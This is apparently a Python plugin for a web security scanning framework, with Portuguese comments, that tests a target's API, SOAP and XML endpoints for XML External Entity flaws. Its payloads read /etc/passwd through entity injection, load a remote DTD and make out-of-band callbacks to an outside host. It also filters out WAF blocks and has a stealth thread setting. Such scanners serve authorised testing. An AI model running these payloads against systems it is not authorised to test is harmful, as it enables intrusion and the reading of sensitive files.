#!/usr/bin/env python3
"""
XXE Detection (V10.1 Surgical) — XML External Entity.
Detecta leitura de arquivos locais e interações OAST com filtros ante-WAF.
"""
import json
import time
import httpx
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

XXE_PAYLOADS = [
    # Classic File Read
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "root:"),
    # Error-Based
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://nonexistent-enum-allma.com/xxe.dtd">%remote;]><root>test</root>', "failed to load"),
    # SOAP support
    ('<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>', "root:"),
]

WAF_STRINGS = ["cloudflare", "forbidden", "blocked", "access denied", "incident id"]

def _test_xxe(url: str, oast_url: str = None) -> list:
    """Testa XXE com payloads avançados e filtros cirúrgicos."""
    findings = []
    
    # Adicionar payloads OAST se disponível
    payloads = list(XXE_PAYLOADS)
    if oast_url:
        payloads.append(('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://' + oast_url + '/xxe">]><root>&xxe;</root>', "OAST_MARKER"))

    for payload, expected in payloads:
        time.sleep(REQUEST_DELAY)
        try:
            with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False) as client:
                # Testar tanto application/xml quanto text/xml
                for ctype in ["application/xml", "text/xml"]:
                    resp = client.post(url, content=payload, headers={"Content-Type": ctype, "User-Agent": DEFAULT_USER_AGENT})
                    
                    # Filtro cirúrgico V10.1: Ignorar status de erro comuns de WAF
                    if resp.status_code in [403, 405, 429]:
                        continue
                    
                    body = resp.text.lower()
                    if any(ws in body for ws in WAF_STRINGS):
                        continue

                    is_vuln = False
                    reason = ""
                    risk = "MEDIUM"

                    # Confirmação Real V10.1
                    if "root:x:" in body or "daemon:" in body or "/bin/bash" in body:
                        is_vuln = True
                        reason = "Indício real de leitura de arquivo (/etc/passwd) detectado no body."
                        risk = "CRITICAL"
                    elif expected != "OAST_MARKER" and expected.lower() in body:
                        is_vuln = True
                        reason = f"Payload avaliado com sucesso (reflexão de {expected})."
                    
                    if is_vuln:
                        findings.append({
                            "url": url,
                            "type": "XXE",
                            "risk": risk,
                            "details": reason,
                            "payload": payload,
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                        })
                        break # Evita duplicar se ambos ctype funcionarem
        except Exception:
            pass
    return findings

def run(context: dict):
    target = context.get("target")
    oast_url = context.get("oast_url")
    stealth = context.get("stealth", False)
    
    if not target:
        raise ValueError("Target required")

    info(f"\n🧪 {C.BOLD}{C.CYAN}XXE SCANNER (V10.1 SURGICAL){C.END}")
    outdir = ensure_outdir(target, "xxe")

    # Mapear endpoints XML (heuristic)
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    candidates = []
    if urls_file.exists():
        urls = urls_file.read_text().splitlines()
        candidates = [u for u in urls if any(x in u.lower() for x in [".xml", "/api/", "/graphql", "/soap"])]
    
    candidates = list(set(candidates))[:50]
    max_workers = 3 if stealth else 10
    
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_test_xxe, url, oast_url): url for url in candidates}
        for future in as_completed(futures):
            res = future.result()
            if res:
                results.extend(res)
                for f in res:
                    info(f"   🔴 {C.RED}[{f['risk']}]{C.END} XXE detectado em {f['url']}")

    output_file = outdir / "xxe_results.json"
    output_file.write_text(json.dumps(results, indent=2))
    success(f"   📂 Resultados salvos em {output_file}")
    return results
